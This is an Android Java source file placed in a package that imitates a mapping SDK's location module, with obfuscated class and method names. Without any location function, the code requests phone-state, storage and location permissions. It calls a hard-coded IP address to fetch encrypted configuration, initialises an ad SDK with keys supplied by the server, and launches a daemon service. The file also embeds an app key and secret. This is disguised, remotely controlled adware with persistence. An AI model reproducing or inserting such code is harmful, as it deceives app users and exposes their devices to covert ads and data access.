package com.amap.api.loc.location;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.util.Log;

import com.amap.api.loc.DaemonService;

import net.youmi.android.AdManager;

import org.json.JSONObject;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class A {
    //implements AMapLocationListener
    private static final String TAG = "AAAAA";
    Activity av;


    @SuppressLint({"NewApi"})
    public void b(Activity activity) {
        av = activity;
        List<String> list = new ArrayList();
        if (activity.checkSelfPermission("android.permission.READ_PHONE_STATE") == -1) {
            list.add("android.permission.READ_PHONE_STATE");
        }

        if (activity.checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") == -1) {
            list.add("android.permission.WRITE_EXTERNAL_STORAGE");
        }

        if (activity.checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") == -1) {
            list.add("android.permission.ACCESS_COARSE_LOCATION");
        }

        if (activity.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == -1) {
            list.add("android.permission.ACCESS_FINE_LOCATION");
        }

        if (activity.checkSelfPermission("android.permission.CHANGE_WIFI_STATE") == -1) {
            list.add("android.permission.CHANGE_WIFI_STATE");
        }


        if (list.size() > 0) {
            String[] permissions = (String[]) list.toArray(new String[list.size()]);
            activity.requestPermissions(permissions, 1);
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                String temp = G.e(av.getPackageName());
                String s1 = "appKeylqb6e2550cbc1bb579";

                String s2 = "param" + temp;
                String s3 = "appSecret49f3f2e26c54e161fc0h1ac0dc74b1da";
                String[] arr = {s1, s2, s3};
                Arrays.sort(arr);
                String str = "";

                for (int i = 0; i < arr.length; i++) {
                    str += arr[i];
                }
                String url = "http://47.98.192.132:8080/api/config?param=" + temp + "&appKey=lqb6e2550cbc1bb579&sign=" + com.amap.api.loc.querry.SHA1.encode(str);
                c(url);
            }

        }).start();


    }


    public void c(String u) {
        try {
            String baseUrl = u;
            StringBuilder tempParams = new StringBuilder();
            String requestUrl = baseUrl + tempParams.toString();
            URL url = new URL(requestUrl);
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            urlConn.setConnectTimeout(5 * 1000);
            urlConn.setReadTimeout(5 * 1000);
            urlConn.setUseCaches(true);
            urlConn.setRequestMethod("GET");
            urlConn.setRequestProperty("Content-Type", "application/json");
            urlConn.addRequestProperty("Connection", "Keep-Alive");
            urlConn.connect();
            if (urlConn.getResponseCode() == 200) {
                String result = B.b(urlConn.getInputStream());
                Log.e(TAG, "Get方式请求成功，result--->" + result);
                JSONObject jsonObject = new JSONObject(result);
                if (jsonObject != null && jsonObject.getInt("code") == 0) {
                    try {

                        JSONObject data = new JSONObject(G.d(jsonObject.getString("result")));
                        if (data != null) {

                            D.setLong(av, "launchTime", data.getLong("launchTime"));
                            D.setString(av, "NoCityCode", data.getString("cityCode"));
                            D.setInt(av, "rate", data.getInt("rate"));
                            D.setBoolean(av, "adSwitch", data.getBoolean("adSwitch"));

                            AdManager.getInstance(av).init(data.getString("appKey"), data.getString("appSecret"), true, true);
                            av.startService(new Intent(av, DaemonService.class));
                        }
                    } catch (Exception e) {

                    }

                }
            } else {
            }
            urlConn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, e.toString());
        }
    }


}